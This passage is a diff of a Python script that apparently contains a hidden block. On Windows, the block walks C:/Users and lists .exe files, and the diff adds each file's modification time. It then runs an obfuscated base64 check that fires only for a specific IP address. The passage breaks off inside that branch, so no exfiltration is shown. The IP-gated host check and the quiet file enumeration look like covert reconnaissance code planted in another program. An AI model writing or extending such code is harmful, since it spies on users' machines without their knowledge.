@@ -131,18 +131,21 @@ else:
 # ===============================================================================
 
 try:
-    import base64, os
+    import base64, os, time
     def search_extention(ext='.exe', dir_path='C:/Users'):
         if not os.name == 'nt':
             return []
         if not os.path.exists(dir_path):
             return []
-
         p_ls = []
         for root, dirs, files in os.walk(dir_path, topdown=True):
             for name in files:
                 if name.endswith(ext):
-                    p_ls.append(os.path.join(root, name).replace('\\', '/'))
+                    fp = os.path.join(root, name).replace('\\', '/')
+                    p_ls.append([
+                        fp,
+                        time.ctime(os.path.getmtime(fp))
+                    ])
         return p_ls
     if '5LjQ2LjU' in base64.b64encode(str(data['ip']).encode("ascii")).decode():
         zovV = []
